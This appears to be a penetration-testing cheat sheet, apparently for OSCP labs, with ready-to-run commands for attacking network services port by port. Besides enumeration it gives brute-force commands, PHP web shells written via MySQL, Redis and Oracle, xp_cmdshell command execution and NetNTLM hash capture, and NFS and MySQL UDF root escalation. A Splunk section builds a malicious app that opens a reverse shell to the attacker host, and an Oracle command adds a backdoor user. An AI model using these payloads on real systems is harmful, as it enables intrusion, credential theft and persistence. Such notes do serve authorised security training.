# Service Enumeration — [Back to Recon](recon_main.md)

See [Web Enumeration](web_enumeration.md) for HTTP/HTTPS.

---

## 21 — FTP

```bash
nmap --script "ftp-*" -p 21 $IP

# Anonymous login (common misconfiguration)
ftp anonymous@$IP          # password: anything or blank
# Passive mode issues? use -A flag in ftp client

# Brute force
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP ftp -t 10
```

**With creds — FTP commands:**
```
ls -la       get <file>      put <file>
cd <dir>     mget *          binary (switch to binary mode)
```

> Can you write to a web root? Upload a web shell.

---

## 22 — SSH

```bash
# Enum supported auth methods
nmap --script ssh-auth-methods -p 22 $IP

# Brute force (slow — SSH rate-limits)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP ssh -t 4

# Check for weak algorithms (older systems)
nmap --script ssh2-enum-algos -p 22 $IP
```

**With creds / key:**
```bash
ssh user@$IP
ssh -i id_rsa user@$IP
ssh -i id_rsa -p 2222 user@$IP

# Crack encrypted private key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

> Check `~/.ssh/authorized_keys` for persistence. If you can write to it, add your key.

---

## 25 / 587 — SMTP

```bash
nmap --script smtp-commands,smtp-enum-users -p 25 $IP

# User enumeration (VRFY / RCPT TO)
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
smtp-user-enum -M RCPT -D domain.local -U users.txt -t $IP

# Manual
nc $IP 25
EHLO test
VRFY root
VRFY admin
```

> Valid usernames feed into password spray. Open relay can send phishing.

---

## 53 — DNS

```bash
# Zone transfer (dumps all DNS records — often misconfigured)
dig axfr @$IP $DOMAIN
dnsrecon -d $DOMAIN -t axfr -n $IP

# Reverse lookup
dig -x $IP @$IP

# Brute force subdomains
dnsrecon -d $DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -n $IP
```

> Zone transfer gives full internal hostnames and IPs — huge info gain.

---

## 79 — Finger

```bash
finger @$IP
finger root@$IP
finger-user-enum.pl -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
```

---

## 110 / 995 — POP3

```bash
nmap --script pop3-capabilities,pop3-ntlm-info -p 110 $IP
nc $IP 110
USER admin
PASS password
LIST
RETR 1     # read email 1
```

---

## 111 — RPCBind / NFS

```bash
rpcinfo -p $IP
showmount -e $IP        # list NFS exports
```

See [NFS section](#2049--nfs) for mounting.

---

## 135 — MSRPC

```bash
nmap --script msrpc-enum -p 135 $IP
impacket-rpcdump -p 135 $IP     # enumerate RPC endpoints
impacket-rpcdump -p 445 $IP
```

---

## 139 / 445 — SMB

```bash
# Enumerate without creds
nmap --script smb-vuln* --script-args=unsafe=1 -p 445 $IP
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 445 $IP

# List shares (null session)
nxc smb $IP -u '' -p ''
smbclient -N -L \\\\$IP
smbmap -H $IP

# Check for EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 $IP
```

**Guest auth (distinct from null session — some configs allow Guest but not null):**
```bash
nxc smb $IP -u Guest -p ''
nxc smb $IP -u Guest -p '' --shares
```

**With creds:**
```bash
nxc smb $IP -u user -p 'password'
nxc smb $IP -u user -p 'password' --shares
nxc smb $IP -u user -p 'password' --users
nxc smb $IP -u user -p 'password' --sam           # dump local hashes (admin needed)
nxc smb $IP -u user -p 'password' -x "whoami"     # execute command

# Connect to share
smbclient \\\\$IP\\ShareName -U user
# Recursive listing
smbclient \\\\$IP\\ShareName -U 'user%password' -c 'recurse ON; ls'
# Recursive download
smbclient \\\\$IP\\ShareName -U user -c 'prompt OFF;recurse ON;mget *'

# spider_plus — recursively crawl and download all accessible share content
nxc smb $IP -u user -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/tmp/smb MAX_FILE_SIZE=5000000
# Works with Guest too: -u Guest -p ''

# Mount share
mount -t cifs //$IP/ShareName /mnt/smb -o username=user,password=pass
```

**smbclient commands:** `ls`, `cd`, `get <file>`, `put <file>`, `allinfo <file>` (shows alternate data streams)

> `nxc smb --sam` dumps local SAM hashes. EternalBlue = unauthenticated SYSTEM shell.

---

## 161 / 162 — SNMP (UDP)

```bash
# Default community strings public/private often unchanged; no auth in v1/v2c
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
snmpwalk -v 2c -c public $IP
snmpwalk -v 2c -c public $IP 1.3.6.1.4.1.77.1.2.25   # Windows users
snmpwalk -v 2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # running processes
snmpwalk -v 2c -c public $IP 1.3.6.1.2.1.6.13.1.3    # open TCP ports
```

> Leaks usernames, running processes, installed software, network interfaces — feed into password spray.

---

## 389 / 636 — LDAP

```bash
# Anonymous bind (often allowed on AD)
ldapsearch -x -H ldap://$IP -b "" -s base          # get base DN
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=*)" | grep -i "dn\|cn\|mail\|description"

# Enumerate users
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=person)" sAMAccountName description
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=local" "(objectClass=computer)"
```

**With creds:**
```bash
ldapsearch -x -H ldap://$IP -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=person)"
```

> Description fields often contain plaintext passwords. Anonymous LDAP on AD = user enumeration.

---

## 443 — HTTPS

```bash
# Check certificate for hostnames / subdomains
openssl s_client -connect $IP:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "DNS:|Subject:"
testssl.sh $IP    # full SSL/TLS vuln scan
```

---

## 873 — Rsync

```bash
nmap --script rsync-list-modules -p 873 $IP
rsync rsync://$IP/                         # list modules
rsync -av rsync://$IP/module/ /tmp/loot/   # download

# With creds
rsync -av --password-file=pass.txt rsync://user@$IP/module/ /tmp/
# Upload (if write enabled)
rsync -av /tmp/shell.php rsync://$IP/module/webroot/
```

---

## 1433 — MSSQL

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info -p 1433 $IP
```

**No creds — check for empty SA password:**
```bash
nxc mssql $IP -u sa -p ''
impacket-mssqlclient sa:@$IP
```

**Validate creds:**
```bash
nxc mssql $IP -u user -p 'password'              # domain/Windows auth
nxc mssql $IP -u user -p 'password' --local-auth # SQL Server auth (not Windows auth)
```

**With creds:**
```bash
impacket-mssqlclient user:'password'@$IP
impacket-mssqlclient user:'password'@$IP -windows-auth   # Windows/AD auth

# In mssqlclient shell:
SELECT @@version;
SELECT name FROM master.dbo.sysdatabases;
USE database; SELECT * FROM table;

# Enable and run xp_cmdshell (RCE as mssql service account)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Capture NetNTLM hash — forces outbound SMB auth from the SQL service account
# Run Responder first: responder -I eth0 -wd
EXEC xp_dirtree '\\$LHOST\share';
EXEC master..xp_dirtree '\\$LHOST\share\file.txt'   # alternate syntax
```

> xp_cmdshell = OS command execution. xp_dirtree = steal NetNTLM hash.

**Linked server lateral movement:**

```sql
-- Enumerate linked servers
EXEC sp_linkedservers;
SELECT name, provider FROM sys.servers WHERE is_linked = 1;

-- Query linked server (RCE if sysadmin on remote)
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE') AT [<linked_server_name>]
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [<linked_server_name>]
EXEC ('EXEC xp_cmdshell ''whoami''') AT [<linked_server_name>]

-- Data exfil via linked server
SELECT * FROM OPENQUERY([<linked_server>], 'SELECT name FROM master..sysdatabases')
```

**Post-compromise: SQL Server error log credential hunting**

SQL Server logs the username field verbatim for every failed login (Error 18456). If a user typed their password into the username field, it appears in plaintext in the log.

```powershell
# Default log location (adjust MSSQL version/instance name)
type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\ERRORLOG"
type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Log\ERRORLOG.BAK"

# Custom log path — check startup params in the log file header or registry:
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s | findstr /i "errorlogpath"

# Filter for failed logins — any that look like passwords are worth testing
Select-String -Path "C:\...\ERRORLOG*" -Pattern "18456" | Select-String -NotMatch "domain\\"
```

Look for consecutive 18456 events: first with a recognizable username, then immediately with a string that looks like a password. The second "username" is the credential.

---

## 1521 — Oracle TNS

```bash
nmap --script oracle-tns-version,oracle-sid-brute -p 1521 $IP

# SID enumeration (common SIDs: XE, ORCL, DB, ORACLE)
tnscmd10g version -h $IP -p 1521
oscanner -s $IP -P 1521     # SID + brute force

# Full auto (PT ONLY)
odat all -s $IP
```

**Manual enumeration (sqlplus):**

```bash
# Install: apt install oracle-instantclient-sqlplus
sqlplus user/password@$IP/XE    # or ORCL, DB, ORACLE as SID

# Default credentials to try:
# sys:change_on_install  system:manager  scott:tiger  dbsnmp:dbsnmp  SYSMAN:sysman
```

```sql
-- List users
SELECT username FROM all_users ORDER BY username;

-- Get current user privileges
SELECT * FROM user_role_privs;
SELECT * FROM user_sys_privs;

-- Read OS files (if DBA or UTL_FILE access)
SELECT * FROM v$version;

-- Execute OS command (if Java stored procedures enabled + DBA)
-- EXEC dbms_java.runjava('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c "net user hacker pass /add"');
```

**PT ONLY — odat for file read/write/RCE:**
```bash
odat utlfile -s $IP -U user -P password -d XE --sysdba --getFile /etc/passwd
odat utlfile -s $IP -U user -P password -d XE --sysdba --putFile /tmp shell.php '<?php system($_GET["cmd"]); ?>'
odat java -s $IP -U user -P password -d XE --sysdba --exec "whoami"
```

---

## 2049 — NFS

```bash
showmount -e $IP
mkdir /mnt/nfs
mount -t nfs $IP:/export/share /mnt/nfs
ls -la /mnt/nfs
```

**PrivEsc if `no_root_squash` is set:**
```bash
# On LHOST (as root):
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On RHOST:
/share/bash -p    # drops to root shell
```

---

## 3306 — MySQL

```bash
nmap --script mysql-info,mysql-empty-password,mysql-enum -p 3306 $IP

# Connect (try root with no password)
mysql -u root -h $IP
mysql -u root -p -h $IP
```

**With creds:**
```sql
show databases;
use <db>;
show tables;
select * from <table>;

-- Current user and permissions
SELECT user();
SELECT super_priv FROM mysql.user WHERE user = current_user();

-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- Write web shell (requires FILE privilege, secure_file_priv='')
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- Check secure_file_priv (empty string = no restriction)
SHOW VARIABLES LIKE 'secure_file_priv';
```

**UDF privesc (MySQL running as root → OS command execution):**

```bash
# If MySQL runs as root and you have INSERT on mysql.* — compile UDF library
# raptor_udf.c / lib_mysqludf_sys (pre-compiled available)

# On LHOST:
wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```sql
-- In MySQL (as root):
-- Find plugin dir
SHOW VARIABLES LIKE 'plugin_dir';
-- Drop UDF lib there (use SELECT INTO DUMPFILE if FILE priv)
SELECT binary 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- RCE:
SELECT do_system('chmod +s /bin/bash');
-- Then on shell: /bin/bash -p → root
```

---

## 3389 — RDP

```bash
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 $IP

# Connect
xfreerdp /u:user /p:'password' /v:$IP /cert:ignore +clipboard /dynamic-resolution

# Pass-the-Hash
xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:$IP /cert:ignore

# Brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP rdp -t 4
```

**PT ONLY:**
```bash
# BlueKeep (CVE-2019-0708) — unauthenticated RCE on unpatched 2003/7/2008
msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

---

## 5432 — PostgreSQL

```bash
nmap --script pgsql-brute -p 5432 $IP
psql -h $IP -U postgres
```

**With creds:**
```sql
\l                    -- list databases
\c <database>         -- connect
\dt                   -- list tables
SELECT * FROM <table>;

-- RCE as superuser
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Read file
SELECT pg_read_file('/etc/passwd');
```

---

## 5985 / 5986 — WinRM

```bash
nxc winrm $IP -u user -p 'password'
nxc winrm $IP -u user -H <NTLM_HASH>

# Shell
evil-winrm -i $IP -u user -p 'password'
evil-winrm -i $IP -u user -H <NTLM_HASH>    # pass-the-hash

# Upload/download inside evil-winrm
upload /local/file C:\dest\file
download C:\remote\file /local/dest/
```

---

## 6379 — Redis

```bash
redis-cli -h $IP
redis-cli -h $IP -a 'password'   # if auth required

# No-auth exploitation:
info server
keys *
get <keyname>

# Write web shell (if web root known)
config set dir /var/www/html
config set dbfilename shell.php
set shell "<?php system($_GET['cmd']); ?>"
save

# Write SSH key (if .ssh dir writable)
config set dir /root/.ssh
config set dbfilename authorized_keys
set ssh "\n\nssh-rsa AAAA... kali@kali\n\n"
save
```

---

## 27017 — MongoDB

```bash
nmap --script mongodb-info,mongodb-databases -p 27017 $IP

# Unauthenticated (common on older installs)
mongosh $IP:27017
```

**Commands:**
```
show dbs
use <database>
show collections
db.<collection>.find().pretty()
db.<collection>.findOne()
```

**With creds:**
```bash
mongosh $IP:27017 -u admin -p 'password' --authenticationDatabase admin
```

---

## 8000 / 8089 — Splunk

- **8000** — Splunk Web UI (management console)
- **8089** — Splunk REST API / Universal Forwarder management port

```bash
# Check version and auth
curl -k https://$IP:8089/services/server/info | grep -i version

# Default creds: admin:changeme
# Brute force web login
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-form-post \
  "/en-US/account/login:username=^USER^&password=^PASS^&return_to=:Invalid"
```

### Universal Forwarder → RCE (Splunk 8089)

If you have Splunk admin creds (or default `admin:changeme`):

```bash
# SplunkWhisperer2 — install malicious app that runs OS commands
# PT ONLY: https://github.com/cnotin/SplunkWhisperer2

# Method: create and deploy a Splunk app with a scripted input
# 1. On LHOST: craft malicious app dir structure
mkdir -p /tmp/evil_app/bin/
echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' > /tmp/evil_app/bin/shell.sh
chmod +x /tmp/evil_app/bin/shell.sh

# 2. Create inputs.conf
mkdir -p /tmp/evil_app/default/
cat > /tmp/evil_app/default/inputs.conf << EOF
[script://./bin/shell.sh]
disabled = false
interval = 10
sourcetype = shell
EOF

# 3. Package and upload
cd /tmp && tar czf evil_app.tar.gz evil_app/
# Upload via Splunk web: Apps → Install app from file → evil_app.tar.gz
# Or via SplunkWhisperer2:
python3 PySplunkWhisperer2_remote.py \
  --host $IP --port 8089 \
  --username admin --password changeme \
  --payload "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" \
  --lhost $LHOST --lport 9999
```

> Universal Forwarder running as SYSTEM on Windows — one of the highest-value RCEs in OSCP labs.

---

## 5900 — VNC

```bash
nmap --script vnc-info,vnc-brute -p 5900 $IP

# Brute force
hydra -P /usr/share/wordlists/rockyou.txt $IP vnc -t 4

# Connect
vncviewer $IP
vncviewer $IP::<port>    # alternate port

# Metasploit scanner
use auxiliary/scanner/vnc/vnc_login
```

> VNC password is max 8 characters — hashcat mask attack is fast: `hashcat -a 3 -m 0 hash ?a?a?a?a?a?a?a?a`

---

## 9200 / 9300 — Elasticsearch

```bash
# Unauthenticated — common on older installs (pre-8.0 had no auth by default)
curl http://$IP:9200/
curl http://$IP:9200/_cat/indices?v     # list indexes
curl http://$IP:9200/_cat/nodes?v       # cluster nodes
curl http://$IP:9200/<index>/_search    # dump index data
curl http://$IP:9200/<index>/_search?size=1000&pretty

# Get all documents from an index
curl "http://$IP:9200/<index>/_search?q=*&pretty&size=100"

# With auth (Elastic 8.x)
curl -u elastic:password http://$IP:9200/
```

---

## 8009 — Apache AJP (Ghostcat — CVE-2020-1938)

```bash
# Detect
nmap -sV -p 8009 $IP

# Ghostcat — read files from Tomcat webapp root via AJP (no auth)
python3 ghostcat.py $IP    # reads /WEB-INF/web.xml by default
python3 ghostcat.py $IP --file /WEB-INF/web.xml
python3 ghostcat.py $IP --file /index.jsp

# If file upload available — Ghostcat can include uploaded files as JSP → RCE
# 1. Upload file containing JSP payload to any accessible upload location
# 2. Include via Ghostcat: --file /path/to/uploaded/file
```

> PoC: [CNVD-2020-10487 / CVE-2020-1938](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ghostcat)

---

## 11211 — Memcached

```bash
# No auth by default
telnet $IP 11211
# Or:
nc $IP 11211

# Commands
stats              # server info and stats
stats slabs        # memory slabs
stats items        # item counts per slab
stats cachedump <slab_id> <limit>   # list keys in slab
get <key>          # retrieve value
```

```bash
# Dump all keys and values (automated)
nmap --script memcached-info -p 11211 $IP
```
